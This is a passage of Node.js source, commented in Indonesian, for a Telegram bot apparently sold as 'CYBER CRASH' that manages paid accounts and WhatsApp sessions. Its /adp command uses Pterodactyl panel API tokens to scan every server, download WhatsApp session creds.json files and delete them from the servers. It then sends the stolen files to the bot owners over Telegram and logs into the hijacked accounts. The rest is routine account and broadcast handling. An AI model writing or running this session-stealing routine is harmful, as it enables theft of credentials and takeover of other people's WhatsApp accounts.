    return; // Stop middleware lain
  }
  
  next();
});

// --- 5. FUNGSI FINALISASI (SIMPAN KE DB & KIRIM SUKSES) ---
async function finalizeCreation(ctx, userId, finalKey) {
  const state = creationState[userId];
  if (!state) return;

  // Hapus menu interaktif sebelumnya (jika ada, terutama dari pass_manual)
  if (ctx.callbackQuery) {
      await ctx.deleteMessage().catch(() => {});
  } else {
      // Jika dari text manual input, kita coba hapus pesan bot "Silahkan ketik..."
      // (Ini agak tricky tanpa simpan msgId, jadi kita biarkan atau kirim pesan baru)
  }

  // --- LOGIKA DATABASE ---
  const durationMs = parseDuration(state.duration);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  // Cek duplicate & Simpan
  const userIndex = users.findIndex(u => u.username === state.username);
  const userData = { 
      username: state.username, 
      key: finalKey, 
      expired, 
      role: state.role 
  };

  if (userIndex !== -1) {
    users[userIndex] = userData;
  } else {
    users.push(userData);
  }
  saveUsers(users);

  // Format Tanggal
  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  // Hapus State
  delete creationState[userId];

  // Kirim Pesan Sukses
  const keyboard = {
    reply_markup: {
      inline_keyboard: [[{ text: "! Chanel ☇ Apps", url: "https://t.me/Keiraa_About" }]]
    }
  };

  await ctx.reply(
      `<blockquote>CYBER X-Editon [ ☘️ ]</blockquote>\n` +
      `<blockquote> Create Account Sessions Succesfull !!, Silahkan Login Ke Apps Anda</blockquote>\n\n` +
      `<blockquote>📊 DATA ACCOUNT !!</blockquote>\n` +
      `<b>👤Username:</b> <code>${state.username}</code>\n` +
      `<b>🏷️Role:</b> ${state.role.toUpperCase()}\n` + 
      `<b>🛡️Password:</b> <code>${finalKey}</code>\n` +
      `<b>⌛Berlaku:</b> <b>${expiredStr}</b> WIB\n` +
      `<blockquote><b>Syarat Dan Ketentuan</b></blockquote>\n` +
      `— !Dilarang Share Account Secara Free\n` +
      `— !Account Akan Terhapus Jika Durasi Telah Down`,
      { parse_mode: "HTML", ...keyboard }
  );
}

// --- ACTION CANCEL ---
bot.action('cancel_creation', async (ctx) => {
  const userId = ctx.from.id.toString();
  if (creationState[userId]) delete creationState[userId];
  
  await ctx.deleteMessage().catch(() => {});
  await ctx.answerCbQuery("❌ Proses dibatalkan.");
});

bot.command('addpesan', (ctx) => {
    const userId = ctx.from.id.toString();
    
    // 1. Validasi Akses (Hanya Owner & Authorized)
    if (!isOwner(userId) && !isAuthorized(userId)) {
        return ctx.reply("❌ Akses Ditolak. Fitur khusus Owner/Admin.");
    }

    // 2. Ambil Isi Pesan (Mengambil semua teks setelah command)
    // Format: /addpesan Isi Pesan Bebas
    const messageContent = ctx.message.text.split(' ').slice(1).join(' ');
    
    // Cek jika pesan kosong
    if (!messageContent) {
        return ctx.reply(
            "⚠️ *Format Salah!*\n\n" +
            "Gunakan: `/addpesan <Isi Pesan>`\n" +
            "Contoh: `/addpesan Halo member, ada update fitur baru!`", 
            { parse_mode: 'Markdown' }
        );
    }

    // 3. Ambil Database User
    const users = getUsers();
    if (users.length === 0) {
        return ctx.reply("❌ Database user kosong. Belum ada akun yang dibuat.");
    }

    // 4. PROSES BROADCAST KE SEMUA USER
    let successCount = 0;
    const timestamp = Date.now();
    const senderName = ctx.from.first_name || "Admin";

    users.forEach((user, index) => {
        // Buat ID unik untuk setiap pesan
        const msgId = `${timestamp}_${index}`; 
        
        // Push ke Global Messages
        globalMessages.push({
            id: msgId,
            to: user.username,  // <-- Dikirim ke masing-masing username
            from_id: userId,    // ID Telegram Pengirim
            sender_name: senderName,
            content: messageContent,
            timestamp: timestamp,
            read: false,
            replied: false
        });

        successCount++;
    });

    // 5. Laporan Sukses
    ctx.reply(
        `✅ *BROADCAST BERHASIL*\n\n` +
        `💬 Pesan: _${messageContent}_\n` +
        `👥 Penerima: *${successCount}* User\n` +
        `🚀 Status: Terkirim ke Dashboard semua user`, 
        { parse_mode: 'Markdown' }
    );
});

bot.command("ListAccount", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers(); 

  // Validasi Akses Owner
  if (!isOwner(userId)) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nFitur ini khusus Owner.", { parse_mode: "HTML" });
  }

  if (users.length === 0) return ctx.reply("💢 Belum ada akun yang dibuat.");

  let teks = `<blockquote>☘️ All Account Apps CYBER X-Editon</blockquote>\n\n`;

  users.forEach((u, i) => {
    // 1. Ambil Role (Safe Check)
    const userRole = u.role ? u.role.toLowerCase() : "user";
    let roleDisplay = "Member";
    let roleIcon = "😹";

    // Mapping Role
    switch (userRole) {
      case "owner": case "creator":
        roleDisplay = "Owner"; roleIcon = "🥶"; break;
      case "admin":
        roleDisplay = "ADMIN"; roleIcon = "👮"; break;
      case "reseller": case "resell":
        roleDisplay = "Resseler"; roleIcon = "😋"; break;
      case "moderator": case "mod":
        roleDisplay = "MODERATOR"; roleIcon = "🛡️"; break;
      case "vip":
        roleDisplay = "Vip"; roleIcon = "😍"; break;
      case "pt":
        roleDisplay = "PARTNER"; roleIcon = "🤝"; break;
      default:
        roleDisplay = "Member"; roleIcon = "😹"; break;
    }

    // 2. LOGIKA SENSOR PASSWORD (PERBAIKAN ERROR DISINI)
    // Kita pastikan 'u.key' ada isinya. Jika kosong, pakai string kosong.
    const rawKey = u.key ? u.key.toString() : "???"; 
    
    let maskedKey = "";
    if (rawKey === "???") {
        maskedKey = "-(Rusak/No Key)-";
    } else if (rawKey.length <= 5) {
      // Jika pendek, sensor semua
      maskedKey = "•".repeat(rawKey.length);
    } else {
      // Jika panjang, sensor tengah
      const start = rawKey.slice(0, 2);
      const end = rawKey.slice(-2);
      maskedKey = `${start}•••••${end}`;
    }

    // 3. Format Tanggal
    // Tambahkan cek juga takutnya expired undefined
    const expTime = u.expired || Date.now(); 
    const exp = new Date(expTime).toLocaleString("id-ID", {
      year: "numeric", month: "2-digit", day: "2-digit", 
      hour: "2-digit", minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });

    // 4. Susun Pesan
    teks += `<b>${i + 1}. ${u.username}</b> [ ${roleIcon} ${roleDisplay} ]\n`;
    teks += `   🔑 Key: <code>${maskedKey}</code>\n`;
    teks += `   ⌛ Exp: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks, { parse_mode: "HTML" });
});

bot.command("DeteleAccount", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey taitan");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});


// Harus ada di scope: axios, fs, path, ownerIds (array), sessionPath(fn), connectToWhatsApp(fn), bot
bot.command("adp", async (ctx) => {
  const REQUEST_DELAY_MS = 250;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3)
    return ctx.reply(
      "Format salah\nContoh: /adp http://domain.com plta_xxxx pltc_xxxx"
    );

  const domainBase = input[0].replace(/\/+$/, "");
  const plta = input[1];
  const pltc = input[2];

  await ctx.reply("🔍 Mencari creds.json di semua server (1x percobaan per server)...");

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
    });
    const servers = appRes.data?.data || [];
    if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

    let totalFound = 0;

    for (const srv of servers) {
      const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
      if (!identifier) continue;
      const name = srv.attributes?.name || srv.name || identifier || "unknown";

      const commonPaths = [
        "/home/container/session/creds.json",
        "/home/container/sessions/creds.json",
        "/session/creds.json",
        "/sessions/creds.json",
      ];

      let credsBuffer = null;
      let usedPath = null;

      // 🔹 Coba download creds.json dari lokasi umum
      for (const p of commonPaths) {
        try {
          const dlMeta = await axios.get(
            `${domainBase}/api/client/servers/${identifier}/files/download`,
            {
              params: { file: p },
              headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` },
            }
          );

          if (dlMeta?.data?.attributes?.url) {
            const fileRes = await axios.get(dlMeta.data.attributes.url, {
              responseType: "arraybuffer",
            });
            credsBuffer = Buffer.from(fileRes.data);
            usedPath = p;
            console.log(`[FOUND] creds.json ditemukan di ${identifier}:${p}`);
            break;
          }
        } catch (e) {
          // skip ke path berikutnya
        }
        await sleep(REQUEST_DELAY_MS);
      }

      if (!credsBuffer) {
        console.log(`[SKIP] creds.json tidak ditemukan di server: ${name}`);
        await sleep(REQUEST_DELAY_MS * 2);
        continue;
      }

      totalFound++;

      // 🔹 AUTO HAPUS creds.json dari server setelah berhasil di-download
      try {
        await axios.post(
          `${domainBase}/api/client/servers/${identifier}/files/delete`,
          { root: "/", files: [usedPath.replace(/^\/+/, "")] },
          { headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` } }
        );
        console.log(`[DELETED] creds.json di server ${identifier} (${usedPath})`);
      } catch (err) {
        console.warn(
          `[WARN] Gagal hapus creds.json di server ${identifier}: ${
            err.response?.status || err.message
          }`
        );
      }

      // 🔹 Parse nomor WA
      let BotNumber = "unknown_number";
      try {
        const txt = credsBuffer.toString("utf8");
        const json = JSON.parse(txt);
        const candidate =
          json.id ||
          json.phone ||
          json.number ||
          (json.me && (json.me.id || json.me.jid || json.me.user)) ||
          json.clientID ||
          (json.registration && json.registration.phone) ||
          null;

        if (candidate) {
          BotNumber = String(candidate).replace(/\D+/g, "");
          if (!BotNumber.startsWith("62") && BotNumber.length >= 8 && BotNumber.length <= 15) {
            BotNumber = "62" + BotNumber;
          }
        } else {
          BotNumber = String(identifier).replace(/\s+/g, "_");
        }
      } catch (e) {
        console.log("Gagal parse creds.json -> fallback ke identifier:", e.message);
        BotNumber = String(identifier).replace(/\s+/g, "_");
      }

      // 🔹 Simpan creds lokal
      const sessDir = sessionPath(BotNumber);
      try {
        fs.mkdirSync(sessDir, { recursive: true });
        fs.writeFileSync(path.join(sessDir, "creds.json"), credsBuffer);
      } catch (e) {
        console.error("Gagal simpan creds:", e.message);
      }

      // 🔹 Kirim file ke owner
      for (const oid of ownerIds) {
        try {
          await ctx.telegram.sendDocument(oid, {
            source: credsBuffer,
            filename: `${BotNumber}_creds.json`,
          });
          await ctx.telegram.sendMessage(
            oid,
            `📱 *Detected:* ${BotNumber}\n📁 *Server:* ${name}\n📂 *Path:* ${usedPath}\n🧹 *Status:* creds.json dihapus dari server.`,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
          console.error("Gagal kirim ke owner:", e.message);
        }
      }

      const connectedFlag = path.join(sessDir, "connected.flag");
      const failedFlag = path.join(sessDir, "failed.flag");

      if (fs.existsSync(connectedFlag)) {
        console.log(`[SKIP] ${BotNumber} sudah connected (flag exists).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      if (fs.existsSync(failedFlag)) {
        console.log(`[SKIP] ${BotNumber} sebelumnya gagal (failed.flag).`);
        await sleep(REQUEST_DELAY_MS);
        continue;
      }

      // 🔹 Coba connect sekali
      try {
        if (!fs.existsSync(path.join(sessDir, "creds.json"))) {
          console.log(`[SKIP CONNECT] creds.json tidak ditemukan untuk ${BotNumber}`);
        } else {
          await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
          fs.writeFileSync(connectedFlag, String(Date.now()));
          console.log(`[CONNECTED] ${BotNumber}`);
        }
      } catch (err) {
        const emsg =
          err?.response?.status === 404
            ? "404 Not Found"
            : err?.response?.status === 403
            ? "403 Forbidden"
            : err?.response?.status === 440
            ? "440 Login Timeout"
            : err?.message || "Unknown error";

        fs.writeFileSync(failedFlag, JSON.stringify({ time: Date.now(), error: emsg }));
        console.error(`[CONNECT FAIL] ${BotNumber}:`, emsg);

        for (const oid of ownerIds) {
          try {
            await ctx.telegram.sendMessage(
              oid,
              `❌ Gagal connect *${BotNumber}*\nServer: ${name}\nError: ${emsg}`,
              { parse_mode: "Markdown" }
            );
          } catch {}
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0)
      await ctx.reply("✅ Selesai. Tidak ditemukan creds.json di semua server.");
    else
      await ctx.reply(
        `✅ Selesai. Total creds.json ditemukan: ${totalFound}. (Sudah dihapus dari server & percobaan connect dilakukan 1x)`
      );
  } catch (err) {
    console.error("csession error:", err?.response?.data || err.message);
    await ctx.reply("❌ Terjadi error saat scan. Periksa log server.");
  }
});

// --- SETTINGS (Ganti Suka-Suka) ---
const SETTINGS = {
    botName: "CYBER CRASH",
    developer: "@Pahlawanppp",
    partner: "tidak ada",
    version: "2.1",
    serverName: "Pterodactyl-ID"
};

// --- PTERODACTYL MEMORY FIX ---
const getRam = () => {
    // Mengambil Total RAM Server Fisik (Biar kelihatan spek dewa)
    const totalMem = os.totalmem(); 
    const totalGB = (totalMem / 1024 / 1024 / 1024).toFixed(1);
    
    // Mengambil RAM yang sedang dipakai Bot
    const usedMem = process.memoryUsage().rss;
    const usedMB = (usedMem / 1024 / 1024).toFixed(0);

    return `${usedMB} MB / ${totalGB} GB`;
};

// --- RUNTIME FORMATTER ---
const runtime = (seconds) => {
    seconds = Number(seconds);
    const h = Math.floor(seconds % (3600 * 24) / 3600);
    const m = Math.floor(seconds % 3600 / 60);
    const s = Math.floor(seconds % 60);
    return `${h}h ${m}m ${s}s`;
};

// --- HELPER FUNCTIONS ---
// Fungsi sederhana untuk menampilkan baris info tanpa border box
const displayInfo = (label, value, colorHex) => {
    // padEnd(14) digunakan agar titik dua (:) sejajar rapi ke bawah
    const labelStr = chalk.bold.hex(colorHex)(label.padEnd(14)); 
    console.log(` ${labelStr} ${chalk.gray(':')} ${chalk.white(value)}`);
};

// --- MAIN FUNCTION ---
const startDisplay = () => {
    const start = performance.now();
    
    // 1. ASCII Art (Tetap sama)
    console.log(chalk.hex('#00FF80')(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡍⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣻⣽⡶⣛⣯⣴⣷⣞⢷⣶⣯⣟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⢿⡟⠛⣫⣾⡿⣿⣿⣿⣿⣿⣿⣿⣷⡝⣿⣿⣷⣎⢛⠛⣻⠿⣿⣿⣿⣿⣿
⣿⣿⣏⣾⣿⠏⠀⣼⣿⡟⣼⡇⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣷⡡⠙⢿⣷⢸⣿⣿⣿
⣿⣿⣿⡸⠟⢀⣾⣿⡿⢼⣿⠷⣿⣿⣿⣿⡏⢿⣿⣿⣿⣿⡝⣏⣿⣿⡅⠘⡏⣿⣿⣿⣿
⣿⣿⣿⣷⠀⣾⢧⣿⢳⢸⣿⢀⣇⣿⣿⣿⣷⢪⢻⣿⣯⢿⣷⣿⡼⣿⣿⣁⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣸⢸⣼⡟⣿⣉⢿⢸⡼⣞⢿⣿⣿⣞⣷⡽⢿⡾⣿⢾⣇⣿⢹⣧⢿⣿⣿⣿⣿
⣿⣿⣿⣇⣿⡇⣿⣧⢣⣿⠮⡋⠿⣮⣐⢽⣻⠿⠜⡿⠷⡅⢣⡜⣿⢹⢸⣿⡜⣿⣿⣿⣿
⣿⣿⣿⣸⣿⡇⣿⢨⠏⢀⢄⣀⢌⢺⣿⣿⣿⣿⣷⢊⣀⣀⢄⠈⢞⢸⢸⣿⡇⠸⣿⣿⣿
⣿⣿⡏⣿⣿⢹⢻⠘⢰⣇⡟⡍⡇⣾⣿⣿⣿⣿⣯⡦⡏⣽⡞⣧⠸⢸⣼⣿⣿⡆⢻⣿⣿
⣿⣿⣠⣿⣿⡏⡾⢸⣸⣏⠿⡾⢣⣿⣿⣿⣿⣿⣿⣧⠿⠾⣳⣿⣼⣏⣿⣿⣿⣷⣏⣿⣿
⡟⣾⡿⣿⣿⣿⣷⡀⢿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⡿⣰⣿⣿⣿⣿⣿⣿⣇⣿
⣧⣇⣧⢿⣿⣿⣿⣿⡜⣿⣿⣿⣿⣿⣿⣾⣿⣼⣿⣿⣿⣿⡿⣱⣿⣿⣿⣿⣿⡟⣿⣿⢸
⡏⣷⡳⡱⡹⣿⣿⣿⣿⣾⠳⣹⢏⢾⣶⣶⣿⣶⣾⢎⢧⢃⣸⣿⣿⣿⣿⡿⡓⣼⡟⣿⢹
⣿⡝⣿⣮⡊⠘⢿⣿⣿⢀⣌⣽⣶⣿⣿⣿⣿⣿⣿⣿⣾⡅⢿⣿⣿⡿⡟⠑⣼⡿⣹⢏⣿
⣿⣿⣮⣻⠿⣦⢒⣝⡿⢿⣿⣾⣻⠿⠿⣿⡿⠿⠿⠿⢟⣽⡼⢿⣫⣎⢡⡾⣻⠾⣫⣾⣿
⣿⣿⣿⣿⣿⡟⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣶⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿`));
    
    const latensi = (performance.now() - start).toFixed(2);

    // 2. Tampilan Informasi (Tanpa Box)
    console.log(chalk.gray(' ──────────────────────────────────'));
    displayInfo("Name Base", SETTINGS.botName, '#00FFFF');
    displayInfo("Developer", SETTINGS.developer, '#FF00FF');
    displayInfo("My Channels", SETTINGS.partner, '#FF00FF');
    console.log(chalk.gray(' ──────────────────────────────────'));
    
    displayInfo("Pas System", "Linux (Pterodactyl)", '#32CD32');
    displayInfo("Ram", getRam(), '#32CD32'); 
    displayInfo("Runtime", runtime(process.uptime()), '#32CD32');
    displayInfo("Kecepatan", `${latensi} ms`, '#32CD32');
    console.log(chalk.gray(' ──────────────────────────────────'));

    // 3. Footer
    console.log(chalk.white(`\n [ ${chalk.hex('#00FFFF')('INFO')} ] ${chalk.white('Booting up services...')}`));
    console.log(chalk.white(` [ ${chalk.hex('#32CD32')('OK')} ] ${chalk.green('Connected to WhatsApp Web / Server!')}`));
};
startDisplay();
bot.launch();
initializeWhatsAppConnections();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

    try {
        require('./Rute.js')(app, {
            fs: fs,
            path: path,
            sessions: sessions,       
            file_session: file_session,   
            addSender: addSender,      
            getUsers: getUsers,       
            saveUsers: saveUsers       
        });
        console.log(chalk.green("✅ Rute.js Berhasil Dimuat!"));
    } catch (err) {
        console.log(chalk.red("❌ Gagal memuat Rute.js: " + err.message));
    }

    const setupExecution = require('./functionConfig');
    setupExecution(app, sessions, getUsers);

app.listen(PORT, () => {
  console.log(chalk.cyan(`[ SYSTEM WEB ] : PORT ONLINE !!`));
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};
}
(async () => {
    await startSecurity();
})(); 
